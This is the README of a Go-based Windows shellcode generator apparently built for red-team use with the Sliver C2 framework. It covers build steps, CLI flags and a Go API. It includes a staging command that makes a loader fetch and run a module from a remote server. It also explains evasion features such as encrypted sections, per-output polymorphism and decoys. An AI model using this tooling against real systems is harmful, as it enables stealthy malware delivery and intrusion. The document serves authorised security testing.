# Churro

Churro converts a 64-bit Windows PE or script into a position-independent
shellcode buffer. It is an importable Go package and a standalone CLI. It
ports Fritter's host-side generator to Go and keeps the typed payload boundary
used by [Fritter's Go API](https://github.com/sliverarmory/Fritter).

Feature parity work and its acceptance evidence are tracked in
[ROADMAP.md](ROADMAP.md).

The generator and CLI are Go code and do not use cgo. Like
[Malasada](https://github.com/sliverarmory/malasada) and
[Beignet](https://github.com/sliverarmory/beignet), Churro embeds checked-in
native loader blobs. Their source is derived from Fritter at
[`ff952a22`](https://github.com/sliverarmory/Fritter/commit/ff952a22b1cf06d41b3781ab7c20f608b9754e53)
with a local TLS callback fix and named MinGW code sections. The blobs execute
as native code inside a Windows process. Go consumers do not need a C compiler,
Zig, WebAssembly, or a sidecar executable.

## Build

Go 1.24 or newer is required. From this directory:

```sh
make build
make test
```

The checked-in loader blobs and their metadata are build inputs. To regenerate
them from the source in this repository, install a host C compiler and an x64
MinGW cross compiler, then run `make loader-assets`. The default rebuild uses
the pinned constants. Run
`./scripts/rebuild-loader-blobs.sh --rotate --output-dir DIR` to create a
custom bundle with fresh cipher/hash constants and API ordering;
`--seed N` makes that rotation reproducible. See
[`internal/loader/README.md`](internal/loader/README.md). Zig is optional and
is not used in the tested rebuild path. Normal Go builds need neither compiler.

The generated CLI accepts Windows x64 `.exe` and `.dll` images, plus `.vbs`
and `.js` source. Native and managed PE inputs are selected from the PE
headers. A native DLL's `DllMain` runs, followed by the named export when
`-method` is set. Native EXE and DLL entry arguments can be supplied with
`-args`; `-unicode` selects a wide-character DLL export argument.

```sh
./churro-gen -input payload.dll -method StartW -output payload.bin
./churro-gen -input payload.exe -output executable.bin
./churro-gen -input assembly.dll -class Example.Entry -method Run -output managed.bin
```

On Windows, use `churro-gen.exe`. Use `-format` to select `bin` (the default),
`base64`, `c`, `ruby`, `python`, `powershell`, `csharp`, `hex`, or `uuid`. The
`-exit`, `-entropy`, `-headers`, `-decoy`, `-thread`, `-fork`, and `-compression`
flags expose the shared loader and native PE options. See
[`cmd/churro-gen/README.md`](cmd/churro-gen/README.md) for the full CLI
reference, including compatibility aliases and custom loader bundles.

The CLI defaults to aPLib compression, matching Fritter's native CLI. The Go
API's zero-value `CompressionNone` leaves payload bytes uncompressed.

To produce a loader that downloads its module, supply a base URL. The CLI
writes the opaque staged module beside the loader using its generated name, or
to the path selected by `-module-output`. Host that module at the URL formed
from `-server` and its module name; the CLI does not upload it.

```sh
./churro-gen -input payload.dll -method StartW \
    -server https://example.test/modules/ -modname PAYLOAD \
    -output loader.bin -module-output PAYLOAD
```

## Go API

`Generate` accepts payload bytes and returns the loader bytes. It does not
read or write host files. The zero-valued format returns raw shellcode bytes.

```go
result, err := churro.Generate(ctx, churro.Request{
    Payload: churro.NativeDLL{
        Image: dll,
        Export: &churro.NativeDLLExport{Name: "StartW"},
    },
})
if err != nil {
    return err
}
loader := result.Loader
_ = loader
```

The package also has typed `NativeExecutable`, `DotNetExecutable`,
`DotNetDLL`, `VBScript`, and `JScript` requests. Native EXEs accept an argument
tail, and named native DLL exports accept an argument string with an optional
Unicode selection. Managed DLL methods remain parameterless. `Format` controls
the representation of `Result.Loader`; `FormatBinary` is the zero-value
default. `NewWithLoader` accepts a validated native loader bundle for custom
build constants and code images.

## Loader architecture

The checked-in MinGW loader has six code sections and a metadata table for
cross-section calls. Churro's Go generator rewrites protected calls through
dispatch thunks and encrypts four sections independently. The hash section
stays resident because host continuation can call it from two threads. Each
output varies its entry prefix, stack setup, decoder, trampoline, keys, and
dispatch layout.
The native bundle remains a separate build input, so build-level cipher/hash
and API variations require a loader rebuild with `--rotate`.

Execute the returned bytes from a page-aligned allocation. The embedded shim
and native loader are laid out on 4 KiB boundaries relative to the beginning
of that allocation. The Windows test runner uses `VirtualAlloc` for this.

## Verification

`go test ./...` checks request validation, blob generation, and output
formats. Native shellcode execution requires a Windows x64 host. On Windows,
`scripts/test-windows-e2e.ps1` builds native, Go, managed, and script fixtures,
executes generated loaders, and checks payload markers, staging, arguments,
Unicode, TLS, imports, and host continuation.
The Windows GitHub Actions workflow also generates a Sliver shared library,
runs its Churro loader, and requires a matching session-open event.
